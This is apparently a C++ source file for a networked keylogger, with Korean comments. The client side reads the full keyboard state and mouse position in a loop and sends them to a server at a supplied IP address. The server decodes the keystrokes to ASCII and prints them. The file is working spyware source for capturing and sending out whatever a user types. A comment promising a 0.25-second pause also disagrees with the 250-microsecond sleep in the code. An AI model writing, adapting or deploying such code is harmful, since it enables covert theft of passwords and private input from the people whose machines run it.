#include "Keylogger.h"


namespace Mawi1e {
	Keylogger::Keylogger() {
		this->m_Input = nullptr;
		this->m_Network = nullptr;
	}

	Keylogger::Keylogger(const Keylogger&) {
	}

	Keylogger::~Keylogger() {
	}

	bool Keylogger::Initialize(int ServClnt, const char* ipAddress) {
		bool result;

		this->m_ServClnt = ServClnt;

		if (ServClnt == _Mawi1e_KEYLOGGER_CLIENT) {
			this->m_Input = new InputClass;
			if (this->m_Input == nullptr) {
				this->ErrorHandling("#M102");
				return false;
			}

			result = this->m_Input->Initialize();
			if (!result) {
				this->ErrorHandling("#M103");
				return false;
			}
		}


		this->m_Network = new NetworkClass;
		if (this->m_Network == nullptr) {
			this->ErrorHandling("#M100");
			return false;
		}

		result = true;
		if (ServClnt == _Mawi1e_KEYLOGGER_SERVER) {
			result = this->m_Network->Listen(RecvRoutine);
		}
		else if (ServClnt == _Mawi1e_KEYLOGGER_CLIENT) {
			result = this->m_Network->Connect(ipAddress);
		}

		if (!result) {
			this->ErrorHandling("#M101");
			return false;
		}

		return true;
	}

	void Keylogger::Shutdown() {
		if (this->m_Input) {
			this->m_Input->Shutdown();
			delete this->m_Input;
			this->m_Input = nullptr;
		}

		if (this->m_Network) {
			this->m_Network->Shutdown();
			delete this->m_Network;
			this->m_Network = nullptr;
		}

		return;
	}

	void Keylogger::Frame() {
		bool result;

		/** ------------------------------------------------------------------------
		[            클라이언트일경우 입력값업데이트하고, 서버로 전송              ]
		------------------------------------------------------------------------ **/
		for (;;) {
			if (this->m_ServClnt == _Mawi1e_KEYLOGGER_CLIENT) {
				result = this->m_Input->Frame();
				if (!result) {
					this->ErrorHandling("#M104");
					break;
				}

				KeyState keyState;
				auto[myKeyState, mouseX, mouseY] = this->m_Input->GetDeviceState();
				memcpy(keyState.keyboard, (const void*)myKeyState, 256);
				keyState.mouseX = mouseX;
				keyState.mouseY = mouseY;

				result = this->m_Network->SendKeyState(keyState, sizeof(keyState));
				if (!result) {
					this->ErrorHandling("#M105");
					break;
				}

				/** ------------------------------------------------------------------------
				[                             0.25초 블로킹                                ]
				------------------------------------------------------------------------ **/
				std::this_thread::sleep_for(std::chrono::microseconds(250));
			}
		}

		return;
	}

	void Keylogger::ErrorHandling(const char* ErrorMessage) {
		MessageBoxA(0, ErrorMessage, "##Warning##", MB_ICONWARNING);

		return;
	}

	void __stdcall RecvRoutine(DWORD Erorr, DWORD Databytes, LPWSAOVERLAPPED lpOverlapped, DWORD Flags) {
		LPPER_IO ioData = (LPPER_IO)lpOverlapped;
		DWORD RecvFlags;
		int result;

		if (Databytes == 0) {
			/** ------------------------------------------------------------------------
			[                          클라이언트 연결 해제                            ]
			------------------------------------------------------------------------ **/
			std::cout << "[-] Client Disconnection.\n";

			closesocket(ioData->s);
			delete ioData;
			return;
		}

		KeyState keyState;

		/** ------------------------------------------------------------------------
		[              클라이언트로부터 받은메모리를 전용구조체로 복사             ]
		------------------------------------------------------------------------ **/
		memcpy(&keyState, ioData->Message, sizeof(keyState));

		/** ------------------------------------------------------------------------
		[                        CapsLock 토글(Toggle)관리                         ]
		------------------------------------------------------------------------ **/
		ioData->capsLock = (keyState.keyboard[DIK_CAPSLOCK] & 0x80 ? ioData->capsLock ? false : true : ioData->capsLock ? true : false);
		
		/** ------------------------------------------------------------------------
		[                            키보드상태를 분석                             ]
		------------------------------------------------------------------------ **/
		auto[dik, upper, unClickedFlag] = AsciiStringAssembly(keyState.keyboard, ioData->capsLock);
		if (dik > 0) {
			if (ioData->prev_key != dik) {
				ioData->prev_key = dik;
			}
		}
		if (!unClickedFlag && ioData->key_upper != upper) {
			ioData->key_upper = upper;
		}

		/** ------------------------------------------------------------------------
		[                    DIK를 ASCII로 바꾼뒤, 콘솔로 출력                     ]
		------------------------------------------------------------------------ **/
		SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), { 0, 0 });
		std::cout << keyState.mouseX << ", " << keyState.mouseY << ", " << ConvertDIKToAscii(ioData->prev_key, ioData->key_upper) << "\t\t" << std::endl;
		
		/** ------------------------------------------------------------------------
		[                             Overlapped초기화                             ]
		------------------------------------------------------------------------ **/
		memset(&ioData->overlapped, 0x00, sizeof(WSAOVERLAPPED));
		ioData->wsaBuf.len = 0x400;
		ioData->wsaBuf.buf = ioData->Message;
		RecvFlags = 0x00;

		result = WSARecv(ioData->s, &ioData->wsaBuf, 1, 0, &RecvFlags, &ioData->overlapped, RecvRoutine);
		if (result) {
			if (WSAGetLastError() != WSA_IO_PENDING) {
				return;
			}
		}
	}
}